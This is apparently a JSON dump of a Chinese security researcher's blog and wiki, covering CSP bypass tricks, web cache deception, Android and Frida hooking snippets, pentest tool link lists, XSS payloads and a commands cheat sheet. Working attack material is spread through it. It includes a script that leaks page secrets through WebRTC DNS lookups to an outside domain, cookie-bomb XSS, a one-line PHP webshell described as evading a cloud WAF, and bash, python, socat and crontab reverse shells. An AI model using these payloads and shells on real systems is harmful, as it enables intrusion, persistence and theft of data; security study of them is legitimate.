RTCPeerConnection(&#123;'iceServers':[&#123;'urls':['stun:'+window.btoa(document.getElementById(\"secret\").innerHTML).replace('/', '-').replace(' ', '_')+'.stackoff.com:19302']&#125;]&#125;);var dataChannel=peerConn.createDataChannel('xfucker');peerConn.createOffer(&#123;&#125;);peerConn.createOffer(&#123;&#125;).then((desc)=&gt;peerConn.setLocalDescription(desc))&#125;);&lt;/script&gt; iframe 其他页面来绕过csp静态文件1234567frame=document.createElement('iframe');frame.src='/css/bootstrap.min.css';document.body.appendChild(frame);script=document.createElement('script');script.src='//bo0om.ru/csp.js';window.frames[0].document.head.appendChild(script); 400 页面query on level above it at /../ To prevent the browser from normalizing the request and replacing /../ with /, we will use unicode for the dots and the last slash.123frame=document.createElement('iframe');frame.src='/%2e%2e%2f';document.body.appendChild(frame); passing and incorrect unicode path, i.e. /% or /%%z A standard default url length handled by such web-servers and NGINX &amp; Apache is set not to exceed 8kB.123frame=document.createElement('iframe');frame.src='/'+'A'.repeat(20000);document.body.appendChild(frame); browsers support more and longer cookies than web-servers can handle1&lt;script&gt;for(var i=0;i&lt;5;i++)&#123;document.cookie=i+\"=\"+\"a\".repeat(4000)&#125;;f=document.createElement(\"iframe\");f.id=\"pwn\";f.src=\"/\";f.onload=()=&gt;&#123;for(var i=0;i&lt;5;i++)&#123;document.cookie=i+\"=\"&#125;;x=document.createElement('script');x.src='data:,alert(\"Pwned \"+top.secret.textContent)';pwn.contentWindow.document.body.appendChild(x)&#125;;document.body.appendChild(f);&lt;/script&gt; java 调试端口https://github.com/IOActive/jdwp-shellifier dns 中 Unicodedns 会把 Unicode 转成 ASCII curl -i http://sss.exp.5ａlt.me:9999 收到 DNS sss.exp.5alt.mecurl -i http://www.bａidu.com.exp.5alt.me:9999 收到 DNS www.baidu.com.exp.5alt.me 和 www.bａidu.com.exp.5alt.me 不过在实际发送 http 请求的时候，请求头的 host 字段还是之前的样子。NGINX遇到Unicode的头会400。 在浏览器里会都转换完再发请求。 https://en.wikipedia.org/wiki/Unicode_equivalence web 缓存假设客户端请求http://www.example.com/home.php/nonexistent.css 这个URL，其中home.php是真实存在的，而nonexistent.css不存在，那WEB服务器会怎么处理呢？针对这种情况的处理跟WEB服务器用的技术以及配置相关，有的会返回404 not found，有的会返回200 OK，然后把home.php返回回来。如果服务器返回200 OK就要注意了，这时缓存服务器拿到的请求是http://www.example.com/home.php/nonexistent.css，是一个静态页面，而WEB服务器返回给缓存服务器的结果是http://www.example.com/home.php，不是一个静态页面，但是缓存服务器并不知道。 攻击者引诱已登录的用户（受害者）访问https://www.bank.com/account.do/logo.png 受害者请求https://www.bank.com/account.do/logo.png 缓存服务器接收到请求，没查到这个页面，于是向WEB服务器请求 WEB服务器返回https://www.bank.com/account.do，状态码是200 OK 缓存服务器收到结果，由于状态码是200 OK，会认为URL保持不变，然后由于这个URL以.png结尾，认为它是一个静态文件，于是会缓存这个文件 受害者得到正常结果 攻击者访问https://www.bank.com/account.do/logo.png，请求到达缓存服务器，缓存服务器直接返回受害者的缓存账户页面给攻击者，攻击完成。 需要条件 WEB服务器会将类似http://www.example.com/home.php/nonexistent.css这种页面解析为home.php 缓存服务器会无视http header，只根据文件后缀来判断是否缓存该文件 受害者访问该页面时必须已登录"},{"title":"对外公开的一些议题","date":"2019-08-16T04:24:28.939Z","updated":"2019-08-16T04:24:28.939Z","comments":true,"path":"talks/index.html","permalink":"http://5alt.me/talks/index.html","excerpt":"","text":"ZeroNights 2018 Ntlm Relay Reloaded: Attack methods you do not know Who owned your code: Attack surfaces against Git web servers used HITB 2018 Dubai NTLM Relay Is Dead, Long Live NTLM Relay"},{"title":"安卓","date":"2017-07-13T16:00:00.000Z","updated":"2019-08-16T04:24:28.940Z","comments":true,"path":"wiki/Android.html","permalink":"http://5alt.me/wiki/Android.html","excerpt":"","text":"安卓刷机购机指北https://twrp.me/Devices/ 安卓抓包tcpdumphttp://www.androidtcpdump.com/./tcpdump -i any -p -s 0 -w /sdcard/capture.pcap 解决 burp 证书问题 https://github.com/Magisk-Modules-Repo/movecertAndroid 7.0 Nougat 之后，不再信任用户空间装的证书，需要移动到系统目录/system/etc/security/cacerts。系统目录里是 PEM 格式的证书，而 burp 导出是 DER 格式的。对某些手机，burp 生成的证书会有问题，需要在 burp 前套一个其他的代理。 用户安装的证书有效期不能太久。https://www.entrustdatacard.com/blog/2018/february/chrome-requires-ct-after-april-2018 adb 强制安装adb install -r wx.apk frida12345678adb push frida-server /data/local/tmp/adb shellsucd /data/local/tmp/chmod 777 frida-serversetenforce 0./frida-server &amp;adb forward tcp:27042 tcp:27042 syscalls https://github.com/dpnishant/appmon 提示 sudo sysctl kernel.yama.ptrace_scope=0This could also be due to Magisk Hide. Try disabling it and rebooting before running your command. https://github.com/ceres-c/frida-website/blob/41c04f558e918fcbbc95fa7986fadb58dd56503a/_docs/troubleshooting.md frida 脚本https://codeshare.frida.re/browsehttps://github.com/Nightbringer21/fridumphttps://github.com/lyxhh/lxhToolHTTPDecrypthttps://github.com/iddoeldor/frida-snippetshttps://github.com/sensepost/objection js api函数重载和构造函数12var sclass = Java.use(\"xxx.class\");sclass.$new.overload('java.lang.String', 'int').implementation = function() &#123; Hashmap构造和类型转换1234567var HashMap = Java.use(\"java.util.HashMap\");var Map = Java.use(\"java.util.Map\");hashmap = HashMap.$new()var map = Java.cast(hashmap, Map);map.put(\"a\", \"1\");map.put(\"b\", \"2\"); docshttps://pypkg.com/pypi/frida/api/https://github.com/frida/frida-java/blob/master/index.jshttps://docs.oracle.com/javase/specs/jvms/se8/html/jvms-4.html#jvms-4.3.2 安卓命令查看窗口栈12adb shelldumpsys window 查看窗口的activitydumpsys activity top 调起activityam start -n 包名/activity名 参数 有的activity可能需要flagshttp://gityuan.com/2016/02/27/am-command/ xposedhttps://github.com/ac-pm/Inspeckage开启debug https://github.com/pylerSM/XInstaller修改硬件信息 https://github.com/1998lixin/Hardwarecodessl pinning https://github.com/Fuzion24/JustTrustMe 脱壳patch 安卓模拟器源码进行脱壳 https://github.com/CheckPointSW/android_unpackerdex逆向辅助（Dalvik） https://github.com/CalebFenton/dex-oracle安卓反混淆辅助 https://github.com/CalebFenton/simplifyhttps://github.com/WrBug/dumpDex 抓包解密https://github.com/federicodotta/Brida/http://bobao.360.cn/learning/detail/4209.html so 逆向辅助https://github.com/feicong/jni_helper根据.dynamic修复 section table https://github.com/freakishfox/xAnSo (https://bbs.pediy.com/thread-221741.htm) jadx因为Jadx打开apk文件会解析资源文件，如果一个app有很多资源文件，那么Jadx打开就会卡死，所以很多同学问我为什么Jadx打开apk文件就出现卡死状态，主要是因为解析资源文件导致的。所以为了防止卡死，直接解压出dex文件，然后打开就不会卡死了。 工具安卓shell https://termux.com/adb下载 https://developer.android.com/studio/releases/platform-tools.html源码静态分析（可能可以改造） https://github.com/blackarbiter/Android_Code_Arbiter (https://tech.meituan.com/Android-Code-Arbiter.html)Android SDK https://developer.android.com/studio/index.html?hl=zh-cnbusybox https://busybox.net/downloads/binaries/过PackageManager.getPackageInfo().signature方式签名验证 https://github.com/L-JINBIN/ApkSignatureKillerapk自身安全drozer https://github.com/mwrlabs/drozerjadx https://github.com/skylot/jadxGDA(windows) http://www.gda.wiki:9090/https://github.com/MobSF/Mobile-Security-Framework-MobSF 安卓 exploitshttps://github.com/ele7enxxh/poc-exphttps://github.com/ScottyBauer/Android_Kernel_CVE_POCs 免 root hookhttps://github.com/android-hacker/VirtualXposed GenymotionGoogle Appshttp://opengapps.org/https://github.com/opengapps/opengapps ARM_Translationhttps://forum.xda-developers.com/showthread.php?t=2528952 adb在设置里指定adb的path，或者用自带的adb 安卓学习https://github.com/iwannabetop/Awesome-Android-Learning-Guidehttps://github.com/OWASP/owasp-mstg 装机软件黑域 https://piebridge.me/br/原生相机 https://www.celsoazevedo.com/files/android/google-camera/流量控制 https://github.com/ukanth/afwallXPrivacy https://github.com/M66B/XPrivacyLua谷歌框架 http://opengapps.org/绿色守护 https://forum.xda-developers.com/showthread.php?t=2155737代理切换 https://play.google.com/store/apps/details?id=org.proxydroidroot 管理 https://forum.xda-developers.com/apps/magiskProxyDroid https://github.com/madeye/proxydroidAdBlocker 刷机On your device, go into Settings -&gt; About and find the Build Number and tap on it 7 times to enable developer settings. Press back and go into Developer Options and enable USB debugging. From your computer, open a command prompt and type: adb reboot bootloader You should now be in fastboot mode. Your device needs to be unlocked before it can flash custom images. To unlock your device type: fastboot oem unlock Download the correct image file and copy the file into the same folder as your adb and fastboot binaries. Rename the image to twrp.img and type: 进入临时的 twrp: fastboot boot twrp.img 然后用临时的 twrp 刷入 twrp 的 zip 包。 adb reboot recovery 在 recovery 里选择 adb sideload刷机模式。 直接下载 Google play 软件https://apps.evozi.com/apk-downloader/ 其他mount -o rw,remount /system"},{"title":"浏览器相关网站","date":"2017-09-03T16:00:00.000Z","updated":"2019-08-16T04:24:28.940Z","comments":true,"path":"wiki/chrome.html","permalink":"http://5alt.me/wiki/chrome.html","excerpt":"","text":"浏览器status-trackerhttps://platformstatus.io/ Chrome代码搜索https://cs.chromium.org/ 源码https://chromium.googlesource.com/chromium/src.git headless apihttps://github.com/GoogleChrome/puppeteer 插件Extension Features Fileshttps://chromium.googlesource.com/chromium/src/+/master/chrome/common/extensions/api/_features.md Firefoxstatus-trackerhttps://platform-status.mozilla.org/ 浏览器浏览器的域filedatajavascriptblobchrome等自定义特权域名res 文件后缀列表https://cs.chromium.org/chromium/src/chrome/browser/resources/safe_browsing/download_file_types.asciipb?q=download_file_types.asciipb"},{"title":"frida","date":"2019-06-03T16:00:00.000Z","updated":"2019-08-16T04:24:28.940Z","comments":true,"path":"wiki/frida.html","permalink":"http://5alt.me/wiki/frida.html","excerpt":"","text":"nativehook arm 函数可能需要加一也可能不要123456Interceptor.attach(address.add(1), &#123; onEnter: function (args) &#123; &#125;, onLeave: function (retval) &#123; &#125;&#125;); 根据arm spec, 跳转地址最低位( lsb ) 为0表示 arm 指令；最低位为1表示thumb指令。Thumb 可以看作是 ARM 指令集压缩形式的子集，是针对指令长度问题而提出的，它具有 16 位的指令长度（ARM：32 位），但操作数、指令地址这两项 Thumb 均和 ARM 相同，为 32 位，所以如果想要区分当前指令是 ARM 还是 Thumb 通过指令长度就可以知道。 自己写 so 加载进去Making a dylib123456#include &lt;string&gt;extern \"C\" &#123;const char *toUTF8Ref(std::string &amp;str) &#123; return str.c_str();&#125;&#125; Loading the libc 中的用法12345//const RTLD_LAZY = 1;void *handle = dlopen(\"/path/to/getstr_dl.dylib\", RTLD_LAZY); // or RTLD_NOW, doesn't really matter herevoid *toUTF8Ref_ptr = dlsym(handle, \"toUTF8Ref\");/* use toUTF8Ref_ptr */dlclose(handle); 对应到 frida123456789const dlopen = new NativeFunction(Module.findExportByName(null, 'dlopen'), 'pointer', ['pointer', 'int'])const dlsym = new NativeFunction(Module.findExportByName(null, 'dlsym'), 'pointer', ['pointer', 'pointer'])// var handle = dlopen(\"/path/to/getstr_dl.dylib\", 1);// We have to alloc all the strings in process memory first, we can’t pass JS strings to NativeFunction!var path = Memory.allocUtf8String(\"/path/to/getstr_dl.dylib\");var symb = Memory.allocUtf8String(\"toUTF8Ref\");var handle = dlopen(path, 1);var toUTF8Ref_ptr = dlsym(handle, symb);var toUTF8Ref = new NativeFunction(toUTF8Ref_ptr, 'pointer', ['pointer']); Using the lib12345Interceptor.attach(ptr(\"0x103e2c3d0\"), function() &#123; console.log(Memory.readUtf8String( toUTF8Ref(this.context.rdi) )); &#125;) https://stek29.rocks/2017/08/07/frida-stdstring.html java 中加载 so用 System.load / System.loadlibrary，注意自己编译的 so 不能放在/sdcard目录下，安卓目录存在权限问题，最好放应用目录下/data/user/0/com.tencent.wework/lib/！so 的权限要设置好，可以 chmod 777。加载 so 的时候要版本对应。 12345678910111213141516171819202122Java.perform(function () &#123; var System = Java.use('java.lang.System'); System.load.implementation = function(library) &#123; try&#123; var ret = this.load(library) console.log('System.load(\"' + library + '\")'); this.load(\"/data/user/0/com.tencent.wework/lib/libprotobuf-cpp-full.so\") var membase = Module.findBaseAddress('libprotobuf-cpp-full.so'); console.log('libprotobuf.so', membase) this.loadLibrary(\"stdc++\") var membase = Module.findBaseAddress('libstdc++.so'); console.log('stdc++', membase) return ret &#125; catch (e) &#123; console.log(e); &#125; &#125;;&#125;); 123456789101112131415Java.perform(function () &#123; const System = Java.use('java.lang.System'); const Runtime = Java.use('java.lang.Runtime'); const SystemLoad_2 = System.loadLibrary.overload('java.lang.String'); const VMStack = Java.use('dalvik.system.VMStack'); try&#123; const loaded = Runtime.getRuntime().load(\"/data/user/0/com.tencent.wework/lib/libnative-lib.so\", VMStack.getCallingClassLoader()); var membase = Module.findBaseAddress('libnative-lib.so'); console.log('libnative-lib.so', membase) console.log(Module.findExportByName('libnative-lib.so', '_Z13getStringDumpPv')) &#125;catch(e)&#123; console.log(e) &#125;&#125;) attach 的话需要找到 classLoaderhttps://github.com/frida/frida-java/issues/63#issuecomment-384629231 通过 this 指针找类名12var pSize = Process.pointerSize;var class_name = args[0].readPointer().sub(pSize).readPointer().add(pSize).readPointer().readCString() 调用栈123var trace = Thread.backtrace(this.context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress);console.log(name + ': ');for (var j in trace) console.log(trace[j]); javabyte arrayjs -&gt; java1234567// var buffer = Java.array('byte', [ 13, 37, 42 ]);function hexToBytes(hex) &#123; for (var bytes = [], c = 0; c &lt; hex.length; c += 2) bytes.push(parseInt(hex.substr(c, 2), 16)); return bytes;&#125;Java.array('byte', hexToBytes(hex_cmd)); SecretKeySpec1234567891011121314Java.perform(function () &#123; var SecretKeySpec = Java.use('javax.crypto.spec.SecretKeySpec'); SecretKeySpec.$init.overload('[B', 'java.lang.String').implementation = function(p0, p1) &#123; console.log('SecretKeySpec.$init(\"' + bytes2hex(p0) + '\", \"' + p1 + '\")'); return this.$init(p0, p1); &#125;;&#125;);function bytes2hex(array) &#123; var result = ''; console.log('len = ' + array.length); for(var i = 0; i &lt; array.length; ++i) result += ('0' + (array[i] &amp; 0xFF).toString(16)).slice(-2); return result;&#125; loadLibrary12345678910111213141516171819202122232425Java.perform(function() &#123; const System = Java.use('java.lang.System'); const Runtime = Java.use('java.lang.Runtime'); const VMStack = Java.use('dalvik.system.VMStack'); System.loadLibrary.implementation = function(library) &#123; try &#123; console.log('System.loadLibrary(\"' + library + '\")'); const loaded = Runtime.getRuntime().loadLibrary0(VMStack.getCallingClassLoader(), library); return loaded; &#125; catch(ex) &#123; console.log(ex); &#125; &#125;; System.load.implementation = function(library) &#123; try &#123; console.log('System.load(\"' + library + '\")'); const loaded = Runtime.getRuntime().load0(VMStack.getCallingClassLoader(), library); return loaded; &#125; catch(ex) &#123; console.log(ex); &#125; &#125;;&#125;); 调用栈12345var Exc = Java.use(\"java.lang.Exception\");var Log = Java.use(\"android.util.Log\");var e = Exc.$new(\"\");var log = Log.$new();console.log(log.getStackTraceString(e)); Android webview123456789101112131415161718192021Java.perform(function () &#123;var cls = Java.use(\"android.webkit.WebView\");console.log(\"class start:------------------\"); cls.loadUrl.overload(\"java.lang.String\").implementation = function(param)&#123; console.log(\"loadUrl hooked \"+param); this.loadUrl(\"file:///sdcard/1.html\"); &#125;;cls.loadUrl.overload(\"java.lang.String\",\"java.util.Map\").implementation = function(p1,p2)&#123; console.log(\"loadUrl2 hooked\"+p1 + p2); this.loadUrl(\"file:///sdcard/1.html\",null); &#125;;cls.loadDataWithBaseURL.implementation = function(p1,p2,p3,p4,p5)&#123; console.log(\"loadDataWithBaseURL hooked\"+p1 + p2); this.loadDataWithBaseURL(\"file:///sdcard/1.html\",null,null,null,null); &#125;;cls.postUrl.implementation = function(p1,p2)&#123; console.log(\"postUrl hooked\"+p1); this.postUrl(\"file:///sdcard/1.html\",null); &#125;;&#125;); context12var currentApplication = Java.use('android.app.ActivityThread').currentApplication();var context = currentApplication.getApplicationContext(); refshttps://awakened1712.github.io/hacking/hacking-frida/https://mabin004.github.io/2018/03/09/Android-Hook-%E2%80%94%E2%80%94-Frida/https://github.com/iddoeldor/frida-snippetshttps://github.com/0xdea/frida-scripts"},{"title":"","date":"2019-08-16T04:24:28.940Z","updated":"2019-08-16T04:24:28.940Z","comments":true,"path":"wiki/fun.html","permalink":"http://5alt.me/wiki/fun.html","excerpt":"","text":"http://fritzing.org/learning/https://cn0xroot.com/ 微信提醒http://sc.ftqq.com/ 微博rsshttps://github.com/zgq354/weibo-rss google voicehttps://ifttt.com/applets/70088424d-keep-google-voice-active frp 代理反弹https://github.com/fatedier/frp/ mini dockerhttps://github.com/fireflyc/mini-docker ios 越狱https://coolstar.org/electra/ 旧版本软件http://www.oldapps.com/"},{"title":"WIKI","date":"2017-06-11T16:00:00.000Z","updated":"2019-08-20T02:59:19.408Z","comments":true,"path":"wiki/index.html","permalink":"http://5alt.me/wiki/index.html","excerpt":"","text":"web安全工具 逆向 密码学 wargame Android 装机"},{"title":"ios","date":"2018-04-12T16:00:00.000Z","updated":"2019-08-16T04:24:28.940Z","comments":true,"path":"wiki/ios.html","permalink":"http://5alt.me/wiki/ios.html","excerpt":"","text":"xcode等工具历史版本下载https://developer.apple.com/download/more/ 砸壳程序下载https://www.iphonecake.com/ ipa 重打包https://github.com/Naituw/IPAPatchhttps://paper.seebug.org/250/"},{"title":"pwn","date":"2017-08-16T16:00:00.000Z","updated":"2019-08-16T04:24:28.941Z","comments":true,"path":"wiki/pwn.html","permalink":"http://5alt.me/wiki/pwn.html","excerpt":"","text":"A collection of JavaScript engine CVEs with PoCshttps://github.com/tunz/js-vuln-db CTF-pwn-tipshttps://github.com/Naetw/CTF-pwn-tips syscall 调用https://w3challs.com/syscalls/"},{"title":"wargame 平台","date":"2017-06-21T16:00:00.000Z","updated":"2019-08-16T04:24:28.941Z","comments":true,"path":"wiki/wargame.html","permalink":"http://5alt.me/wiki/wargame.html","excerpt":"","text":"技术讲解https://ctf-wiki.github.io/ctf-wiki/https://firmianay.gitbooks.io/ctf-all-in-one/content/https://github.com/firmianay/CTF-All-In-One pwnhttps://io.netgarage.org/https://pwnable.tw/http://chall.pwn-with.mehttp://pwnable.kr/https://github.com/xerof4ks/heapwn 逆向http://reversing.kr/ 密码学https://id0-rsa.pubhttps://cryptopals.com/ webhttp://redtiger.labs.overthewire.org/https://chall.stypr.comhttps://github.com/CHYbeta/Code-Audit-Challengeshttps://github.com/bowu678/php_bugshttps://github.com/SpiderLabs/MCIR xsshttp://escape.alf.nu/http://xss-quiz.int21h.jp/http://prompt.ml/0https://alf.nu/alert1https://xss-game.appspot.com/https://brutelogic.com.br/knoxss.html 综合https://www.hackthis.co.uk/http://www.gameofhacks.com/https://bamboofox.cs.nctu.edu.tw/ 视频https://www.youtube.com/user/GynvaelEN/ bugbountyhttps://zeroday.hitcon.org/https://www.vulbox.com/https://www.bugcrowd.com/https://www.hackerone.com/ 测试环境https://github.com/incredibleindishell/sqlite-lab"},{"title":"webshell","date":"2017-08-17T16:00:00.000Z","updated":"2019-08-16T04:24:28.941Z","comments":true,"path":"wiki/webshell.html","permalink":"http://5alt.me/wiki/webshell.html","excerpt":"","text":"过阿里云&lt;?php @array_filter(array(file_get_contents(&#39;php://input&#39;)), &#39;assert&#39;);"},{"title":"渗透测试","date":"2018-02-25T16:00:00.000Z","updated":"2019-08-16T04:24:28.940Z","comments":true,"path":"wiki/pentest.html","permalink":"http://5alt.me/wiki/pentest.html","excerpt":"","text":"漏洞库https://www.exploitalert.com/api.html web 漏洞javaSpring Data Commons RCE CVE-2018-1273 代理reGeorghttps://github.com/sensepost/reGeorg 钓鱼office 漏洞CVE-2017-11882https://github.com/Ridter/CVE-2017-11882 CVE-2017-8759https://github.com/vysec/CVE-2017-8759http://fuping.site/2017/09/14/CVE-2017-8759-Remote-Code-Execution-Vulnerability-Replication/ CVE-2017-0199用的是word漏洞CVE-2017-0199远控用的是Cobalt Strike，免杀，dump hash和调用mimikatz不触发管家报警，只有bypass uac的时候会被杀生成hta，任务计划执行schtasks /create /tn &quot;test&quot; /tr &quot;D:\\\\$RECYCLE.BIN\\\\system.hta&quot; /sc DAILY /st 11:10 内网渗透Red Hat DHCP客户端命令执行漏洞(CVE-2018-1111)https://cert.360.cn/warning/detail?id=f075706d5a3c7efbb56efeead3d68a72 物理接触u盘打开种马https://github.com/3gstudent/CVE-2017-8464-EXP 资讯类hacktivityhttps://hackerone.com/hacktivity?sort_type=popular&amp;filter=type%3Aall&amp;page=1&amp;range=forever"},{"title":"","date":"2019-08-16T04:24:28.941Z","updated":"2019-08-16T04:24:28.941Z","comments":true,"path":"wiki/windows.html","permalink":"http://5alt.me/wiki/windows.html","excerpt":"","text":"exploitshttps://github.com/51x/WHP processhackerhttp://processhacker.sourceforge.net/ netcathttps://eternallybored.org/misc/netcat/ kmshttps://github.com/Wind4/vlmcsd 用签名的exe执行命令http://www.hexacorn.com/blog/2017/11/10/reusigned-binaries-living-off-the-signed-land/http://sysadminconcombre.blogspot.ca/2018/04/run-system-commands-through-nvidia.html 提权https://ohpe.github.io/juicy-potato/ 关闭 445 端口sc stop lanmanserversc config lanmanserver start=disablednetstat -n -a | findstr “LISTENING” | findstr “:445” 用cmd命令关闭防火墙net stop mpssvcnet start mpssvc"},{"title":"XSS Payload","date":"2017-08-14T16:00:00.000Z","updated":"2019-08-16T04:24:28.942Z","comments":true,"path":"wiki/xsspayload.html","permalink":"http://5alt.me/wiki/xsspayload.html","excerpt":"","text":"xss 测试&lt;////--&gt;&lt;details open ontoggle=confirm(1)&gt; ​​​​ 上传swf内容文件读页面上传任意后缀文件，只要内容不被改变，就能用来读页面内容。 https://github.com/nccgroup/CrossSiteContentHijacking http://0me.me/demo/SOP/CrossDomainDataHijackHelper.html 该页面flash文件已经删了 如果响应头里有 Content-Disposition: Attachment 且文件名可控，文件名包含了0x0D/0x0A/0x00其中的任何一个即可去掉该头。 另外，如果响应头里有 X-Content-Type-Options:nosniff 则不能完成攻击。 参考https://soroush.secproject.com/blog/2014/05/even-uploading-a-jpg-file-can-lead-to-cross-domain-data-hijacking-client-side-attack/ 302跳转到小于80的端口可阻止跳转，执行body内容##1234&lt;a href=&quot;javas cript:alert(1)&quot;&gt;asassas&lt;/a&gt;location=&quot;javas \\ cript:alert(1)&quot;` 123456789&lt;svg&gt;&lt;a xml:base=&quot;javascript:alert(1)//&quot; href=&quot;#&quot;&gt;&lt;circle r=&quot;100&quot; /&gt;&lt;/svg&gt;//Firefox :)&lt;math xml:base=&quot;javascript:alert(1)//&quot;&gt; &lt;mrow href=&quot;#&quot;&gt;qwe&lt;/mrow&gt;&lt;/math&gt;"},{"title":"","date":"2019-08-16T04:24:28.942Z","updated":"2019-08-16T04:24:28.942Z","comments":true,"path":"wiki/字典.html","permalink":"http://5alt.me/wiki/字典.html","excerpt":"","text":"中文人名语料库https://github.com/wainshine/Chinese-Names-Corpus"},{"title":"密码学相关的工具和代码","date":"2017-06-13T16:00:00.000Z","updated":"2019-08-16T04:24:28.942Z","comments":true,"path":"wiki/密码学相关.html","permalink":"http://5alt.me/wiki/密码学相关.html","excerpt":"","text":"在线工具http://www.factordb.com/ (大整数分解)http://rumkin.com/tools/cipher/ (经典密码学算法)https://malicioussha1.github.io (sha1 碰撞)http://quipqiup.com (置换密码，频率破解)https://redkestrel.co.uk/products/decoder/ (在线解析证书) 解析 public key123456from Crypto.PublicKey import RSAp = &apos;&apos;&apos;-----BEGIN PUBLIC KEY-----xxx-----END PUBLIC KEY-----&apos;&apos;&apos;k=RSA.importKey(p)k.n, k.e 123$ openssl rsa -RSAPublicKey_in -text &lt; [infile] &gt; [outfile] # for pkcs1 public keys$ openssl rsa -pubin -text &lt; [infile] &gt; [outfile] # for pkcs8 public keys$ openssl rsa -text &lt; [infile] &gt; [outfile] # for private keys md5 碰撞https://github.com/cr-marcstevens/hashclash"},{"title":"一些常用工具整理","date":"2017-04-21T16:00:00.000Z","updated":"2019-08-16T04:24:28.941Z","comments":true,"path":"wiki/web安全工具.html","permalink":"http://5alt.me/wiki/web安全工具.html","excerpt":"","text":"windows 免杀远控Cobalt Strike 信息收集C段https://phpinfo.me/bing.php 公司ip段http://bgp.he.net 同ip反查http://i.links.cn/sameip/61.164.241.103.htmlhttp://s.tool.chinaz.com/samehttp://www.114best.com/ip/114.aspxhttps://www.yougetsignal.com/tools/web-sites-on-web-server/http://tool.114la.com/sameip/http://www.sameip.org/ Transparency Monitoringhttps://developers.facebook.com/tools/ct/https://transparencyreport.google.com/https/certificates passive dnshttps://www.circl.lu/services/passive-dns/https://www.passivetotal.org/https://www.virustotal.com/fr/documentation/public-api/#getting-ip-reportshttps://dnsdumpster.com/https://findsubdomains.com/https://github.com/michenriksen/aquatonehttps://github.com/d4wner/farmscan_domain_plus 地区ip中国ip http://www.ipdeny.com/ipblocks/data/countries/cn.zone 网站证书查看http://web.chacuo.net/netsslcheck 域名历史http://toolbar.netcraft.com/site_report?url=5alt.mehttps://www.benmi.com/whoishistory/ 其他https://x.threatbook.cn/https://censys.io/data 数据https://scans.io/study/sonar.fdns_v2https://data.4tu.nl/repository/uuid:1ef815ea-cb39-4b41-8db6-c1008af6d5aa （DNS Queries to Authoritative DNS Server at SURFnet by Google’s Public DNS Resolver） 扫描器https://github.com/lijiejie/BBScanhttps://github.com/We5ter/Scanners-Boxhttps://github.com/xmendez/wfuzz 查找cdn后原始iphttps://github.com/christophetd/CloudFlairhttps://github.com/MindPointGroup/cloudfrunt 端口扫描zmap 扫单一端口sudo zmap -p 80 -o results.csv 10.0.0.0/24 massscan 扫多端口sudo ./masscan -p1-65535 10.0.0.024 -oJ result.json 隐藏身份https://www.noip.com/https://github.com/fate0/proxylist/blob/master/proxy.list127.0.0.1.xip.iohttps://proxy.coderbusy.com/https://github.com/SpiderClub/haipproxy 社工库不打码https://dumpedlqezarfife.onion.lu/ 打码http://163.donothackme.club/https://haveibeenpwned.com/ 注册查询https://namechk.com/http://www.reg007.com/ Twitter信息查询https://tinfoleak.com/ 社工库搜索https://github.com/woanware/LogViewerhttp://sary.sourceforge.net/ 10e以下数据推荐 hashmd5http://cmd5.com/http://www.md5.cc/https://www.somd5.com/http://pmd5.com/ window hashhttp://www.objectif-securite.ch/ophcrack.php 漏洞库https://sploitus.com/https://www.vulncode-db.com/ url 搜索（可以搜到一些恶意网站）https://urlscan.io/search/#* 密码生成https://github.com/bit4woo/passmaker字典 https://github.com/rootphantomer/Blasting_dictionaryhttps://github.com/LandGrey/pydictor 勒索软件解密https://www.nomoreransom.org/ 批量扫描https://fofa.so/https://www.zoomeye.org web 指纹识别https://github.com/Ms0x0/Dayuhttps://github.com/boy-hack/w9scanhttps://github.com/Tuhinshubhra/CMSeeK 渗透辅助https://github.com/BugScanTeam/DNSLog 在线运行php https://3v4l.org/ 数据库连接https://www.adminer.org java 反序列化问题https://github.com/mbechler/marshalsechttps://github.com/GrrrDog/Java-Deserialization-Cheat-Sheethttps://github.com/federicodotta/Java-Deserialization-Scanner web 学习https://github.com/CHYbeta/Web-Security-Learning 静态代码分析java http://find-sec-bugs.github.io/ruby https://github.com/thesp0nge/dawnscannerhttps://github.com/nccgroup/VCG php 代码加密解密PHP代码修复工具(针对乱码类、混淆类文件修复) http://zhaoyuanma.com/phpcodefix.html 前端库安全https://retirejs.github.io/retire.js/ github 搜索https://github.com/5alt/GitLeakhttps://github.com/zricethezav/gitleaks unicode 同形字http://www.unicode.org/Public/security/latest/confusablesSummary.txt 反编译 flashhttps://www.free-decompiler.com/flash/ git/svn 泄露https://github.com/anantshri/svn-extractorhttps://github.com/BugScanTeam/GitHack 漏洞环境https://github.com/Medicean/VulAppshttps://github.com/vulhub/vulhub CSP 解析https://csp-evaluator.withgoogle.com/ xsshttps://github.com/masatokinugawa/filterbypass/wiki/Browser&#39;s-XSS-Filter-Bypass-Cheat-Sheet uxsshttps://github.com/Metnew/uxss-db js 混淆https://github.com/javascript-obfuscator/javascript-obfuscatorhttps://javascriptobfuscator.herokuapp.com/https://github.com/mishoo/UglifyJS2https://prepack.io/getting-started.html js 反混淆https://mindedsecurity.github.io/jstillery/https://github.com/mindedsecurity/JStillery pochttps://github.com/CHYbeta/cmsPochttps://github.com/Lucifer1993/AngelSword burpunlimitedhttps://sourceforge.net/projects/burpunlimited/?source=directoryhttps://github.com/bit4woo/u2c 模板注入辅助https://github.com/epinna/tplmap 其他营业执照 http://zz.iis1.cn/身份证生成 http://id.100xiao.com/ 爆破参数https://github.com/Bo0oM/ParamPamPam nginx 配置生成https://nginxconfig.io/"},{"title":"","date":"2019-08-16T04:24:28.942Z","updated":"2019-08-16T04:24:28.942Z","comments":true,"path":"wiki/常用命令和小技巧.html","permalink":"http://5alt.me/wiki/常用命令和小技巧.html","excerpt":"","text":"反弹 shellbashbash -i &gt;&amp; /dev/tcp/attackerip/1234 0&gt;&amp;1 pythonpython -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.0.0.1”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’ crontab 反弹shell60 min 弹一次1(crontab -l;printf \"*/60 * * * * exec 9&lt;&gt; /dev/tcp/127.0.0.1/8888;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\\rno crontab for `whoami`%100c\\n\")|crontab - TTY Shell123456789python -c 'import pty; pty.spawn(\"/bin/sh\")'#Listener:socat file:`tty`,raw,echo=0 tcp-listen:4444#Victim:socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444/bin/sh -iperl —e 'exec \"/bin/sh\";' linux sed 